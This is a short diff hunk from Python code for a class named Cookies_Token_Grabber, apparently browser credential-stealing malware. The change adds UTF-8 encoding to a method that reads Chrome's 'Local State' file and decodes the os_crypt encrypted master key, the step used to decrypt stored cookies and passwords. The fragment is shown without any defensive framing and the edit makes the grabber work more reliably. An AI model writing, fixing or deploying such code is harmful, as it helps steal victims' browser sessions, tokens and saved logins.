@@ -86,7 +86,7 @@ class Cookies_Token_Grabber:
             f.write(content2)
 
     def get_master_key(self):
-        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
+        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r" , encoding="utf-8") as f:
             local_state = f.read()
         local_state = json.loads(local_state)
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
